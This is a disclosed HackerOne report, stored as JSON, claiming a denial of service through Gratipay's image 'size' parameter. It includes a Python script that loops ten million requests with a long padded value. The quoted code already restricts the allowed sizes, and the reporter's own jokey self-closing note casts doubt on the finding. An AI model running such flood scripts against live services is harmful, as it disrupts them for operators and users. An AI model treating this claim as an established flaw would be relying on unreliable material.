{"id":247700,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNDc3MDA=","url":"https://hackerone.com/reports/247700","title":"Application-level DoS on image's \"size\" parameter.","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2017-07-10T12:41:39.049Z","submitted_at":"2017-07-10T12:41:39.049Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"edoverflow","url":"/edoverflow","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1868,"url":"https://hackerone.com/gratipay","handle":"gratipay","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/868/a75c6649c5b4671b3cf44160af884a7da9fd0b67_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/868/a75c6649c5b4671b3cf44160af884a7da9fd0b67_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"disabled","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Gratipay","twitter_handle":"Gratipay","website":"https://gratipay.com/","about":"Gratitude? Gratipay! The easiest way for your company to pay for open source."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-11-02T19:16:20.811Z","bug_reporter_agreed_on_going_public_at":"2017-11-02T19:05:56.906Z","team_member_agreed_on_going_public_at":"2017-11-02T19:16:20.561Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"# Summary\n---\n\nThe `size` parameter located on images is vulnerable to DoS. By modifying the parameter's value an attacker can cause the application to work very slowly.\n\n# Description\n---\n\nThe issue is located in the `get_image_url()` function in `gratipay/models/team/__init__.py` and can be exploited by replacing the `small` or `large` values in the following GET request: `http://\u003cGRATIPAY INSTANCE\u003e/\u003cUSER\u003e/image?size=small`.\n\n~~~python\n# Images\n# ======\n\nIMAGE_SIZES = ('original', 'large', 'small')\n\ndef get_image_url(self, size):\n    assert size in ('original', 'large', 'small'), size\n    return '/{}/image?size={}'.format(self.slug, size)\n~~~\n\nLink: https://github.com/gratipay/gratipay.com/blob/1985e43033edd87bd16cdb46c16adbcda0bb6bc4/gratipay/models/team/__init__.py#L312-L314\n\n# How can this issue be exploited?\n---\n\nRepeatedly sending values of 4094 characters in length will cause the DoS.\n\n~~~python\nimport requests\npayload = \"a\" * 4094\nurl = \"http://\u003cGRATIPAY INSTANCE\u003e/\u003cUSER\u003e/image?size=small\" + payload\n\nfor i in range(10000000):\n\trequests.get(url)\n~~~","vulnerability_information_html":"\u003ch1 id=\"summary\"\u003eSummary\u003c/h1\u003e\n\n\u003chr\u003e\n\n\u003cp\u003eThe \u003ccode\u003esize\u003c/code\u003e parameter located on images is vulnerable to DoS. By modifying the parameter\u0026#39;s value an attacker can cause the application to work very slowly.\u003c/p\u003e\n\n\u003ch1 id=\"description\"\u003eDescription\u003c/h1\u003e\n\n\u003chr\u003e\n\n\u003cp\u003eThe issue is located in the \u003ccode\u003eget_image_url()\u003c/code\u003e function in \u003ccode\u003egratipay/models/team/__init__.py\u003c/code\u003e and can be exploited by replacing the \u003ccode\u003esmall\u003c/code\u003e or \u003ccode\u003elarge\u003c/code\u003e values in the following GET request: \u003ccode\u003ehttp://\u0026lt;GRATIPAY INSTANCE\u0026gt;/\u0026lt;USER\u0026gt;/image?size=small\u003c/code\u003e.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"c1\"\u003e# Images\n# ======\n\u003c/span\u003e\n\u003cspan class=\"n\"\u003eIMAGE_SIZES\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;original\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;large\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;small\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eget_image_url\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"bp\"\u003eself\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003esize\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eassert\u003c/span\u003e \u003cspan class=\"n\"\u003esize\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;original\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;large\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;small\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"n\"\u003esize\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;/{}/image?size={}\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nb\"\u003eformat\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"bp\"\u003eself\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eslug\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003esize\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eLink: \u003ca title=\"https://github.com/gratipay/gratipay.com/blob/1985e43033edd87bd16cdb46c16adbcda0bb6bc4/gratipay/models/team/__init__.py#L312-L314\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fgratipay%2Fgratipay.com%2Fblob%2F1985e43033edd87bd16cdb46c16adbcda0bb6bc4%2Fgratipay%2Fmodels%2Fteam%2F__init__.py%23L312-L314\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/gratipay/gratipay.com/blob/1985e43033edd87bd16cdb46c16adbcda0bb6bc4/gratipay/models/team/__init__.py#L312-L314\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch1 id=\"how-can-this-issue-be-exploited\"\u003eHow can this issue be exploited?\u003c/h1\u003e\n\n\u003chr\u003e\n\n\u003cp\u003eRepeatedly sending values of 4094 characters in length will cause the DoS.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003erequests\u003c/span\u003e\n\u003cspan class=\"n\"\u003epayload\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;a\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"mi\"\u003e4094\u003c/span\u003e\n\u003cspan class=\"n\"\u003eurl\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;http://\u0026lt;GRATIPAY INSTANCE\u0026gt;/\u0026lt;USER\u0026gt;/image?size=small\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"n\"\u003epayload\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003ei\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"nb\"\u003erange\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e10000000\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n    \u003cspan class=\"n\"\u003erequests\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eget\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-12-02T19:05:57.062Z","allow_singular_disclosure_after":-96977104.648642,"singular_disclosure_allowed":true,"vote_count":14,"voters":["hunter","sameerphad72","badcracker","sh1yo","karel_origin","hackedbrain","eveeez","imranhudaa","b3nac","cr4xerbik4sh","and 4 more..."],"severity":{"rating":"high","score":7.5,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"none","integrity":"none","availability":"high"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1819809,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nThank you for your report, the receipt of which we herewith confirm. We are currently verifying the issue you reported.\n\nPlease expect additional feedback from us within the next couple of days. The \"INFORMATION SECURITY\" section of the following page has additional, useful information regarding our platform's security: http://inside.gratipay.com/howto/manage-risk\n\nWe appreciate your interest in securing our platform and look forward to working with you.\n\nYours sincerely,\nThe Gratipay Security Team","markdown_message":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eThank you for your report, the receipt of which we herewith confirm. We are currently verifying the issue you reported.\u003c/p\u003e\n\n\u003cp\u003ePlease expect additional feedback from us within the next couple of days. The \u0026quot;INFORMATION SECURITY\u0026quot; section of the following page has additional, useful information regarding our platform\u0026#39;s security: \u003ca title=\"http://inside.gratipay.com/howto/manage-risk\" href=\"/redirect?url=http%3A%2F%2Finside.gratipay.com%2Fhowto%2Fmanage-risk\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://inside.gratipay.com/howto/manage-risk\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eWe appreciate your interest in securing our platform and look forward to working with you.\u003c/p\u003e\n\n\u003cp\u003eYours sincerely,\u003cbr\u003e\nThe Gratipay Security Team\u003c/p\u003e\n","automated_response":true,"created_at":"2017-07-10T12:41:39.180Z","updated_at":"2017-07-10T12:41:39.180Z","actor":{"url":"/gratipay","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/868/a75c6649c5b4671b3cf44160af884a7da9fd0b67_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Gratipay"}},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1819897,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2017-07-10T13:06:31.465Z","updated_at":"2017-07-10T13:06:31.465Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2129030,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi to myself,\n\nI think you are perfectly aware of the reason why I am closing this report. Unlucky for you, you won't be receiving any reputation for this report. Try harder next time. ;)\n\nBest regards,\nYou","markdown_message":"\u003cp\u003eHi to myself,\u003c/p\u003e\n\n\u003cp\u003eI think you are perfectly aware of the reason why I am closing this report. Unlucky for you, you won\u0026#39;t be receiving any reputation for this report. Try harder next time. ;)\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nYou\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-02T19:05:42.830Z","updated_at":"2017-11-02T19:05:42.830Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"edoverflow","url":"/edoverflow"},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2129032,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-11-02T19:05:56.961Z","updated_at":"2017-11-02T19:05:56.961Z","first_to_agree":true,"actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2129062,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Hi,\n\nYou're probably getting tired of Ed so that's why I'm disclosing this report for you.","markdown_message":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eYou\u0026#39;re probably getting tired of Ed so that\u0026#39;s why I\u0026#39;m disclosing this report for you.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-02T19:16:20.612Z","updated_at":"2017-11-02T19:16:20.612Z","actor":{"username":"karel_origin","cleared":false,"url":"/karel_origin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/077/693/a209ab3606bc8a68fc577dc38b001c8f66b3d561_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2129063,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-11-02T19:16:20.894Z","updated_at":"2017-11-02T19:16:20.894Z","actor":{"username":"karel_origin","cleared":false,"url":"/karel_origin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/077/693/a209ab3606bc8a68fc577dc38b001c8f66b3d561_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}